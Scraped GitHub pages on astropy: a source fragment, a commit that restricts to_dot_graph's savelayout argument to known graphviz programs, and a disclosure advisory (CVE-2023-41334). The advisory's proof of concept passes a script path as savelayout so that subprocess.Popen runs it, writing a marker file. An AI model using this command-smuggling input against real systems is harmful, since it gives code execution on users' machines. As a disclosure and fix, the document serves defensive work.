 def \_\_init\_\_( self, func, fromsys, tosys, priority=1, register\_graph=None, finite\_difference\_frameattr\_name="obstime", finite\_difference\_dt=1 \* u.second, symmetric\_finite\_difference=True, ): super().\_\_init\_\_(func, fromsys, tosys, priority, register\_graph) self.finite\_difference\_frameattr\_name = finite\_difference\_frameattr\_name self.finite\_difference\_dt = finite\_difference\_dt self.symmetric\_finite\_difference = symmetric\_finite\_difference
 @property def finite\_difference\_frameattr\_name(self): return self.\_finite\_difference\_frameattr\_name
 @finite\_difference\_frameattr\_name.setter def finite\_difference\_frameattr\_name(self, value): if value is None: self.\_diff\_attr\_in\_fromsys = self.\_diff\_attr\_in\_tosys = False else: diff\_attr\_in\_fromsys = value in self.fromsys.frame\_attributes diff\_attr\_in\_tosys = value in self.tosys.frame\_attributes if diff\_attr\_in\_fromsys or diff\_attr\_in\_tosys: self.\_diff\_attr\_in\_fromsys = diff\_attr\_in\_fromsys self.\_diff\_attr\_in\_tosys = diff\_attr\_in\_tosys[View remainder of file in raw view](https://github.com/astropy/astropy/raw/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_d6a46d3f_20250111_103859.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fastropy%2Fastropy%2Fcommit%2F22057d37b1313f5f5a9b5783df0a091d978dccb5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fastropy%2Fastropy%2Fcommit%2F22057d37b1313f5f5a9b5783df0a091d978dccb5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=astropy%2Fastropy)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[astropy](/astropy)
/
**[astropy](/astropy/astropy)**
Public

* [Notifications](/login?return_to=%2Fastropy%2Fastropy) You must be signed in to change notification settings
* [Fork
  1.8k](/login?return_to=%2Fastropy%2Fastropy)
* [Star
   4.5k](/login?return_to=%2Fastropy%2Fastropy)

* [Code](/astropy/astropy)
* [Issues
  1.3k](/astropy/astropy/issues)
* [Pull requests
  89](/astropy/astropy/pulls)
* [Actions](/astropy/astropy/actions)
* [Projects
  2](/astropy/astropy/projects)
* [Wiki](/astropy/astropy/wiki)
* [Security](/astropy/astropy/security)
* [Insights](/astropy/astropy/pulse)

Additional navigation options

* [Code](/astropy/astropy)
* [Issues](/astropy/astropy/issues)
* [Pull requests](/astropy/astropy/pulls)
* [Actions](/astropy/astropy/actions)
* [Projects](/astropy/astropy/projects)
* [Wiki](/astropy/astropy/wiki)
* [Security](/astropy/astropy/security)
* [Insights](/astropy/astropy/pulse)

## Commit

[Permalink](/astropy/astropy/commit/22057d37b1313f5f5a9b5783df0a091d978dccb5)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

MNT: Explicit option for savelayout in to\_dot\_graph

[Browse files](/astropy/astropy/tree/22057d37b1313f5f5a9b5783df0a091d978dccb5)
Browse the repository at this point in the history

* Loading branch information

[![@pllim](https://avatars.githubusercontent.com/u/2090236?s=40&v=4)](/pllim)

[pllim](/astropy/astropy/commits?author=pllim "View all commits by pllim")
committed
Aug 27, 2023

1 parent
[026a140](/astropy/astropy/commit/026a140cec08a9e5b7c80726956969290f50e2d4)

commit 22057d3

Showing
**1 changed file**
with
**16 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

18 changes: 16 additions & 2 deletions

18
[astropy/coordinates/transformations.py](#diff-9bc02cadb87a4383d3e3a825ab578d2b9c832c63af62c33177cf8bd179b331fa "astropy/coordinates/transformations.py")

Show comments

[View file](/astropy/astropy/blob/22057d37b1313f5f5a9b5783df0a091d978dccb5/astropy/coordinates/transformations.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -492,7 +492,7 @@ def to\_dot\_graph( |
|  |  | savefn : None or str |
|  |  | The file name to save this graph to or `None` to not save |
|  |  | to a file. |
|  |  | savelayout : str |
|  |  | savelayout : {"plain", "dot", "neato", "fdp", "sfdp", "circo", "twopi", "nop", "nop2", "osage", "patchwork"} |
|  |  | The graphviz program to use to layout the graph (see |
|  |  | graphviz\_ for details) or 'plain' to just save the DOT graph |
|  |  | content. Ignored if ``savefn`` is `None`. |
| Expand Down  Expand Up | | @@ -571,7 +571,19 @@ def to\_dot\_graph( |
|  |  | if savelayout == "plain": |
|  |  | with open(savefn, "w") as f: |
|  |  | f.write(dotgraph) |
|  |  | else: |
|  |  | # Options from https://graphviz.org/docs/layouts/ |
|  |  | elif savelayout in ( |
|  |  | "dot", |
|  |  | "neato", |
|  |  | "fdp", |
|  |  | "sfdp", |
|  |  | "circo", |
|  |  | "twopi", |
|  |  | "nop", |
|  |  | "nop2", |
|  |  | "osage", |
|  |  | "patchwork", |
|  |  | ): |
|  |  | args = [savelayout] |
|  |  | if saveformat is not None: |
|  |  | args.append("-T" + saveformat) |
| Expand All | | @@ -587,6 +599,8 @@ def to\_dot\_graph( |
|  |  |  |
|  |  | with open(savefn, "w") as f: |
|  |  | f.write(stdout) |
|  |  | else: |
|  |  | raise NotImplementedError(f'savelayout="{savelayout}" is not supported') |
|  |  |  |
|  |  | return dotgraph |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `22057d3`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fastropy%2Fastropy%2Fcommit%2F22057d37b1313f5f5a9b5783df0a091d978dccb5) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_47dc9fb8_20250111_103859.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fastropy%2Fastropy%2Fsecurity%2Fadvisories%2FGHSA-h2x6-5jx5-46hf)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fastropy%2Fastropy%2Fsecurity%2Fadvisories%2FGHSA-h2x6-5jx5-46hf)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=astropy%2Fastropy)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[astropy](/astropy)
/
**[astropy](/astropy/astropy)**
Public

* [Notifications](/login?return_to=%2Fastropy%2Fastropy) You must be signed in to change notification settings
* [Fork
  1.8k](/login?return_to=%2Fastropy%2Fastropy)
* [Star
   4.5k](/login?return_to=%2Fastropy%2Fastropy)

* [Code](/astropy/astropy)
* [Issues
  1.3k](/astropy/astropy/issues)
* [Pull requests
  89](/astropy/astropy/pulls)
* [Actions](/astropy/astropy/actions)
* [Projects
  2](/astropy/astropy/projects)
* [Wiki](/astropy/astropy/wiki)
* [Security](/astropy/astropy/security)
* [Insights](/astropy/astropy/pulse)

Additional navigation options

* [Code](/astropy/astropy)
* [Issues](/astropy/astropy/issues)
* [Pull requests](/astropy/astropy/pulls)
* [Actions](/astropy/astropy/actions)
* [Projects](/astropy/astropy/projects)
* [Wiki](/astropy/astropy/wiki)
* [Security](/astropy/astropy/security)
* [Insights](/astropy/astropy/pulse)

# RCE in TranformGraph().to\_dot\_graph function

High

[eteq](/eteq)
published
GHSA-h2x6-5jx5-46hf
Mar 18, 2024

## Package

pip

astropy
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

5.3.2

## Patched versions

5.3.3

## Description

### Summary

RCE due to improper input validation in TranformGraph().to\_dot\_graph function

### Details

Due to improper input validation a malicious user can provide a command or a script file as a value to `savelayout` argument, which will be placed as the first value in a list of arguments passed to `subprocess.Popen`.

[astropy/astropy/coordinates/transformations.py](https://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539)

Line 539
in
[9b97d98](/astropy/astropy/commit/9b97d98802ee4f5350a62b681c35d8687ee81d91)

|  | args = [savelayout] |
| --- | --- |

Although an error will be raised, the command or script will be executed successfully.
### PoC

```
$ cat /tmp/script
#!/bin/bash
echo astrorce > /tmp/poc.txt
```

```
$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from astropy.coordinates.transformations import TransformGraph
>>> tg = TransformGraph()
>>> tg.to_dot_graph(savefn="/tmp/1.txt", savelayout="/tmp/script")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/u32i/.local/lib/python3.9/site-packages/astropy/coordinates/transformations.py", line 584, in to_dot_graph
    stdout, stderr = proc.communicate(dotgraph)
  File "/usr/lib/python3.9/subprocess.py", line 1134, in communicate
    stdout, stderr = self._communicate(input, endtime, timeout)
  File "/usr/lib/python3.9/subprocess.py", line 1961, in _communicate
    input_view = memoryview(self._input)
TypeError: memoryview: a bytes-like object is required, not 'str'
>>>
```

```
$ cat /tmp/poc.txt
astrorce
```
### Impact

code execution on the user's machine

### Severity

High

7.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### CVE ID

CVE-2023-41334

### Weaknesses

[CWE-20](/advisories?query=cwe%3A20)

### Credits

* [![@u32i](https://avatars.githubusercontent.com/u/109034767?s=40&v=4)](/u32i)
  [u32i](/u32i)
  Finder

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


